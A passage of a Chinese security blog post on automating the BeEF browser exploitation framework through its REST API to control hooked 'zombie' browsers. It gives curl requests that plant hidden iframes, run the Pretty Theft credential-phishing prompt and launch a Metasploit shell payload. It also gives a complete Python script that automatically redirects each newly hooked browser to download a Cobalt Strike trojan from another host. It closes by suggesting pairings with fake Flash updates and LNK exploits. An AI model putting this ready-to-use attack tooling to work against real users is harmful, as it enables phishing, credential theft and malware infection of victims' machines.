+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>
+    sessionId <span class="token operator">=</span> <span class="token string">"ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso"</span>
+    key <span class="token operator">=</span> <span class="token string">"dadd1be063d3a3b4339d84f5bdbbcbb25616b41d"</span>
+    <span class="token keyword">print</span> execJavascript<span class="token punctuation">(</span>host<span class="token punctuation">,</span>sessionId<span class="token punctuation">,</span>key<span class="token punctuation">)</span>
+</code></pre>
+<p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155834290-1948404420.png" alt="img"></p>
+<p>弹出了窗口</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155804853-1359816839.png" alt="img"></p>
+<p>再举个带参数的例子，这次我使用的是Create Invisible Iframe模块，它的功能是创建一个隐藏的Frame。</p>
+<p>这个模块的id为174，需要的参数是隐藏的Frame所指向的url地址</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608190416903-771897904.png" alt="img"></p>
+<p>先查看一下模块的详细参数</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608191702309-1914275279.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615153958915-885891081.png" alt="img"></p>
+<p>可以看到，这个请求的这个url参数名为”target”。下面进行测试，我们使用python创建一个简单的HTTP服务器</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608192353684-2054230154.png" alt="img"></p>
+<p>我们用curl构造请求</p>
+<pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"target":"http://192.168.1.133:8000/"}'</span> http://192.168.1.133:3000/api/modules/tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU/174?token<span class="token operator">=</span>32c75b5e91ef4e519da119349d2c0cbd7cd23259
+</code></pre>
+<p>执行成功，python HTTP上成功回显，说明我们在目标的浏览器上创建了一个隐藏的iframe，并使其访问了这个url地址</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608223339903-90503676.png" alt="img"></p>
+<p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615154145259-431225205.png" alt="img"></p>
+<h2 id="获取模块执行结果"><a href="#获取模块执行结果" class="headerlink" title="获取模块执行结果"></a>获取模块执行结果</h2><p>有些模块执行完毕后，我们需要获取返回的数据，比如凭证欺骗模块Pretty Theft，我们想要获取用户输入的认证口令。</p>
+<p>我们使用一个简单的windows凭证认证模板</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609162357934-1487342041.png" alt="img"></p>
+<p>这时候目标浏览器上会弹出认证框</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609161931012-1900384378.png" alt="img"></p>
+<p>模拟提交了凭证之后，从beef的执行结果中，我们可以看到欺骗到的密码</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609162133403-1950800768.png" alt="img"></p>
+<p>下面就通过API调用执行该模块，先看下参数</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615160147759-668975630.png" alt="img"></p>
+<p>查看模块详细信息，我们可以知道，需要设置的参数有：欺骗对话框类型”choice”，背景风格”backing”，Logo的图片地址”imgsauce” ，因此请求示例应该像这样：</p>
+<pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"choice":"Windows","backing":"Grey","imgsauce":"http://0.0.0.0:3000/ui/media/images/beef.png"}'</span> http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/117?token<span class="token operator">=</span>dadd1be063d3a3b4339d84f5bdbbcbb25616b41d
+</code></pre>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615160851853-202353993.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615160749431-930877960.png" alt="img"></p>
+<p>　　</p>
+<p>执行成功，并且返回了模块执行的id为35。假设我们提交的口令是：test333/123456</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170614001556040-491212835.png" alt="img"></p>
+<p>我们想要获取受害者提供的这些认证信息，这时候，我们需要这样请求：</p>
+<pre class=" language-bash"><code class="language-bash">/api/modules/浏览器session/模块id/command_id？token<span class="token operator">=</span>xxx
+</code></pre>
+<p> 比如</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615161100837-1887025062.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615161120290-855046422.png" alt="img">  </p>
+<h2 id="Beef与metasploit联用"><a href="#Beef与metasploit联用" class="headerlink" title="Beef与metasploit联用"></a>Beef与metasploit联用</h2><p>　　我们当然不能忘记了metasploit这个神器。Beef与metasploit联用，实在是个大杀器。要想在beef加载metasploit，我们首先需要修改默认的配置文件，修改beef下<code>config.yaml</code>文件</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608170549684-1233972575.png" alt="img"></p>
+<p>把启用<code>metasploit</code>这个选项值改成<code>true</code></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608170832622-145925591.png" alt="img"></p>
+<p>另外,如果你的metasploit安装位置不包含在默认路径里，需要在<code>beef-xss/extensions/metasploit/config.yaml</code>的文件里设置一下</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608171240090-406564106.png" alt="img"></p>
+<p>然后我们启动msf加载<code>msgrpc</code></p>
+<pre class=" language-bash"><code class="language-bash">msfconsole -x <span class="token string">"load msgrpc ServerHost=127.0.0.1 Pass=abc123"</span>
+</code></pre>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608171842528-1564566798.png" alt="img"></p>
+<p>重启beef即可加载metasploit模块</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608172313700-431421692.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608172818497-792530133.png" alt="img"></p>
+<p>　　同样的，如果你想调用Metasploit模块，步骤与前面的都一样，先查看改模块的id所需参数等信息，然后构造请求调用这个模块即可，关于metasploit模块调用，因为过两天就要考试了，没有时间做测试，有兴趣的朋友可以试一试。这个是 BeEF-RESTful-API的上一个请求示例。</p>
+<pre class=" language-bash"><code class="language-bash">curl -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}'</span> -X POST http://xxxx/api/modules/浏览器session?token<span class="token operator">=</span>xxx
+</code></pre>
+<h1 id="三-编写自动化控制脚本"><a href="#三-编写自动化控制脚本" class="headerlink" title="三. 编写自动化控制脚本"></a>三. 编写自动化控制脚本</h1><p>　　下面我尝试编写一个简单的自动控制hook主机的脚本，批量执行我提前设定的一些模块。我的思路是定时获取hook主机的session信息 ，存放到一个字典里，如果有新上线的僵尸主机的浏览器session，我们就通过API控制这个浏览器执行我们设定好的Beef模块，并把这个session添加到一个列表里，表示已经执行过。如果检测到某个session已经存在于列表中，说明已经执行过，就不再执行。测试的代码中，我用到了三个模块：Confirm Close Tab，Raw Javascript，Redirect Browser。第一个模块用于增加shell存活时间，第二个模块用于执行javascript代码，第三个模块使浏览器进行跳转下载，我把这个跳转地址指向一个Cobalt Strike生成的测试木马，并模拟受害者自动下载并运行恶意软件。</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># ** Author: ssooking</span>
+<span class="token comment" spellcheck="true"># ** Name： AutoBeef.py</span>
+
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> urllib2
+<span class="token keyword">import</span> time
+
+hostlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+hostdict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+
+<span class="token keyword">def</span> <span class="token function">getauthkey</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    apiurl <span class="token operator">=</span>  host <span class="token operator">+</span> <span class="token string">"api/admin/login"</span>
+    logindata <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"beef"</span><span class="token punctuation">,</span>
+        <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"beef"</span>
+    <span class="token punctuation">}</span>
+    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>logindata<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 对数据进行JSON格式化编码</span>
+    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 生成页面请求的完整数据</span>
+    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 发送页面请求</span>
+    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true"># 获取服务器返回的页面信息，数据类型为str</span>
+    jsondata <span class="token operator">=</span>  json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resdata<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 把数据解析成python对象，此时返回dict数据</span>
+    <span class="token keyword">return</span> jsondata<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">getHookedBrowsersSession</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host <span class="token operator">+</span> <span class="token string">"/api/hooks?token="</span> <span class="token operator">+</span> authkey<span class="token punctuation">)</span>
+    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    hookonline <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'hooked-browsers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'online'</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> hookonline<span class="token punctuation">:</span>
+        hookid <span class="token operator">=</span> hookonline<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>
+        hookip <span class="token operator">=</span> hookonline<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span>
+        hooksession <span class="token operator">=</span> hookonline<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span>
+        <span class="token keyword">if</span> hookid <span class="token operator">not</span> <span class="token keyword">in</span> hostdict<span class="token punctuation">:</span>
+            hostdict<span class="token punctuation">[</span>hookid<span class="token punctuation">]</span> <span class="token operator">=</span> hooksession
+            <span class="token keyword">print</span> <span class="token string">"\n[+] Hooked host id:  "</span> <span class="token operator">+</span> bytes<span class="token punctuation">(</span>hookid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n   >>> IP: "</span> <span class="token operator">+</span> bytes<span class="token punctuation">(</span>hookip<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n   >>> Session: "</span> <span class="token operator">+</span> hooksession
+
+<span class="token keyword">def</span> <span class="token function">sendConfirm</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    postdata <span class="token operator">=</span> <span class="token string">'{}'</span>
+    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> session <span class="token operator">+</span> <span class="token string">"/177?token="</span> <span class="token operator">+</span> authkey
+    <span class="token comment" spellcheck="true">#print url</span>
+    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> postdata<span class="token punctuation">)</span>
+    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>
+    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Confirm Close Tab has been Executed ! "</span>
+    <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">execJavascript</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    payload<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"alert('Hello by ssooking!');"</span>
+    <span class="token punctuation">}</span>
+    apiurl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> session <span class="token operator">+</span> <span class="token string">"/169?token="</span> <span class="token operator">+</span> authkey
+    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>
+    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>
+    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
+    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Raw JavaScript has been Executed ! "</span>
+    <span class="token keyword">return</span> resdata
+
+<span class="token keyword">def</span> <span class="token function">redirectBrowser</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"redirect_url"</span><span class="token punctuation">:</span><span class="token string">"http://192.168.1.133:8000/plugins.exe"</span><span class="token punctuation">}</span>
+    apiurl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> session <span class="token operator">+</span> <span class="token string">"/42?token="</span> <span class="token operator">+</span> authkey
+    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>
+    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>
+    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
+    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    jsondata <span class="token operator">=</span>  json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resdata<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Redirect Browser has been Executed ! "</span>
+    <span class="token keyword">return</span> jsondata
+
+<span class="token keyword">def</span> <span class="token function">createIFrame</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    postdata <span class="token operator">=</span> <span class="token string">'{"target":"http://192.168.1.133:8000/"}'</span>
+    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> sessionId <span class="token operator">+</span> <span class="token string">"/174?token="</span> <span class="token operator">+</span> authkey
+    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> postdata<span class="token punctuation">)</span>
+    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>
+    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Create Invisible Iframe has been Executed ! "</span>
+    <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">autoRunModules</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>session<span class="token punctuation">,</span>authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true">#sendConfirm(host, session, authkey)</span>
+    <span class="token comment" spellcheck="true">#execJavascript(host, session, authkey)</span>
+    redirectBrowser<span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">timeRun</span><span class="token punctuation">(</span>interval<span class="token punctuation">,</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    authkey <span class="token operator">=</span> getauthkey<span class="token punctuation">(</span>host<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token string">"[+] AutoBeef is running...."</span>
+    <span class="token keyword">print</span> <span class="token string">"[+] BeEF KEY is : "</span><span class="token operator">+</span> authkey
+    <span class="token keyword">print</span> <span class="token string">"[+] Base BeEF API URL: "</span><span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"api/"</span>
+    <span class="token keyword">print</span> <span class="token string">"[+] Hook URL   : "</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"hook.js"</span>
+    <span class="token keyword">print</span> <span class="token string">"[+] Hook Demo  : "</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"demos/basic.html"</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            getHookedBrowsersSession<span class="token punctuation">(</span>host<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span>
+            <span class="token keyword">for</span> x <span class="token keyword">in</span> hostdict<span class="token punctuation">:</span>
+                <span class="token keyword">if</span> hostdict<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> hostlist<span class="token punctuation">:</span>
+                    hostlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hostdict<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>
+                    autoRunModules<span class="token punctuation">(</span>host<span class="token punctuation">,</span>hostdict<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span>authkey<span class="token punctuation">)</span>
+            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>interval<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">print</span> e
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    beefhost <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>
+    timeRun<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>beefhost<span class="token punctuation">)</span>
+
+</code></pre>
+<p>代码比较挫，没有什么要说的，容易遇到问题的地方是处理返回的数据类型，需要注意str，dict，list等数据类型的处理与转换。我先只执行一个<code>Redirect Browser</code>模块  <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617003311540-78403110.png" alt="img"></p>
+<p>程序检测到有新的上线控制僵尸，会控制浏览器自动下载我们的恶意程序</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617003541103-212055404.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615152255946-2107420660.png" alt="img"></p>
+<p>一旦受害者点击这个程序</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615152403571-828718163.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617001607243-12774633.png" alt="img"></p>
+<p>当受害者运行恶意软件时，我们可以获得控制权</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617002351884-563419008.png" alt="img"></p>
+<p> 当然我们也可以执行多个模块，你只需要在<code>autoRunModules</code>函数中添加你想执行的模块即可，比如我再测试执行<code>Confirm Close Tab</code>，<code>Raw Javascript</code>两个模块</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617005001353-1901279339.png" alt="img"></p>
+<p> 但是需要注意的是，有些模块功能上是冲突的，不能一起执行，比如刚才的例子<code>Confirm Close Tab</code>和<code>Redirect Browser</code>。</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004455790-594573000.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004850509-742204547.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004904337-1959497895.png" alt="img"></p>
+<p> 我们可以执行多个模块，运行截图</p>
+<p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004610321-454563044.png" alt="img"></p>
+<p>到这里也就基本差不多了，只要思路够开阔，就有很多好玩的姿势，下面一些好玩的模块：</p>
+<blockquote>
+<p>Create Invisible Frame    + Browser Autopwn ：我们可以用metasploit的 Browser Autopwn模块生成一个攻击浏览器的url，然后创建一个隐藏的iframe指向这个url</p>
+<p>Raw Javascript ： 光是这个就能干很多事，不只是弹框哦～～</p>
+<p>Fake Notification Bar ，Fake Flash Update： 伪装浏览器插件，flash升级等，配合执行恶意软件</p>
+<p>Pretty Theft： 欺骗认证凭据的，可以试着自己做个模板，哪里能用到？。。报名统计啦，手机投票啦～～</p>
+</blockquote>
+<p>配合一些漏洞</p>
+<blockquote>
+<p>ms10-046　Microsoft Windows Shell LNK Code Execution</p>
+<p>CVE-2015-0096 Microsoft Windows Shell SMB LNK Code Execution Exploit</p>
+</blockquote>
+<p>不知道能不能配合永恒之蓝的msf模块～～～～</p>
+<p>对于手机，也有很多模块可以使用</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617121511915-926020588.png" alt="img"></p>
+<p><strong>关于代码</strong> </p>
+<p>如果你要使用AutoBeef，你需要对代码进行一些修改使其适应你的beef平台，比如beef主机地址，某个模块的id等等。你可以根据自己的需要添加相关模块，你也可以对其进行优化，使其更加健壮。其实官方也提供了beefapi的库，你可以在这里找到<a href="https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py</a>。通过调用里面的函数，我们也可以很方面地对beef进行控制，但是涉及到执行某个模块时，我们还是需要查看模块详细信息，提供其必要的参数。所以，我建议自己可以动手实现一下，只有这样我们才能进步提高，而且自己写的代码，可以根据自己的需要随时进行拓展修改，遇到问题也能很快解决。</p>
+<p>如果你要使用官方提供的beefAPI，你需要把它移植到你的python库中,kali里默认路径是这样：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">cp</span> beefapi.py /usr/lib/python2.7/dist-packages/
+</code></pre>
+<p> 使用的时候从beefapi中导入即可，你可以查看帮助或者阅读其源代码</p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617123124759-1335061642.png" alt="img"></p>
+<p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617123219259-2082291478.png" alt="img"></p>
+<p><strong>遇到的问题</strong></p>
+<p>　　测试过程中我使用的是chrome和firefox，并且发现IE,360等浏览器无法正常hook。</p>
+<h1 id="四-最后的话"><a href="#四-最后的话" class="headerlink" title="四. 最后的话"></a>四. 最后的话</h1><p>　　只是一句话，不要随便点开一个链接。</p>
+<p>参考文章</p>
+<p><a href="https://github.com/beefproject/beef/wiki/BeEF-RESTful-API" target="_blank" rel="noopener">https://github.com/beefproject/beef/wiki/BeEF-RESTful-API</a></p>
+<p><a href="https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py</a></p>
+
+            </div>
+            <hr>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">您的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">转载请注明: </span>
+                    <a href="https://ssooking.github.io" class="b-link-green">ssooking's blog</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2017/06/25/li-yong-beef-rest-api-zi-dong-hua-kong-zhi-jiang-shi-zhu-ji/" class="b-link-green">利用BeEF REST API自动化控制僵尸主机</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">上一篇</div>
+            <div class="card">
+                <a href="/2017/08/30/get-shell-by-powershell/">
+                    <div class="card-image">
+                        
+                        
